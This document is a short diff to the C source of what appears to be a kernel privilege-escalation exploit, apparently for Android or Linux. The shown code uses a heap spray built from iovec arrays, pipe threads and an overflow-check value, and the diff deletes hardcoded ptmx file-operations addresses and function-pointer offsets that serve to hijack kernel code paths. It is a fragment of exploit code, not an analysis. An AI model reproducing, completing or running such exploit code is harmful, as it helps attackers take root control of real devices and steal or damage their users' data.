@@ -32,11 +32,6 @@ static struct iovec iovs[IOVECS];
 static struct iovec sendiovs[IOVECS];
 static unsigned long overflowcheck = MEMMAGIC;
 
-#define PTMX_FOPS (0xc10ec130)
-#define FSYNC_OFFSET(i) ((i) + (14 * sizeof(void*)))
-#define READ_OFFSET(i) ((i) +  (2 * sizeof(void*)))
-#define CHECK_FLAGS_OFFSET(i) ((i) + (20 * sizeof(void*)))
-
 static void* readpipe(void* param)
 {
 	while(!kill_switch)
@@ -125,7 +120,7 @@ static void* writemsg(void* param)
 	pthread_exit(NULL);
 }
 
-static int heapspray(void* target)
+static int heapspray(long* target)
 {
 	unsigned int i;
 	void* retval;
@@ -139,9 +134,9 @@ static int heapspray(void* target)
 	}
 
 	sendiovs[(IOVECS / 2) + 1].iov_base = &overflowcheck;
-	sendiovs[(IOVECS / 2) + 1].iov_len = sizeof(long);
+	sendiovs[(IOVECS / 2) + 1].iov_len = sizeof(overflowcheck);
 	sendiovs[(IOVECS / 2) + 2].iov_base = target;
-	sendiovs[(IOVECS / 2) + 2].iov_len = sizeof(long);
+	sendiovs[(IOVECS / 2) + 2].iov_len = sizeof(*target);
 
 	for(i = 0; i < SENDTHREADS; i++)
 	{
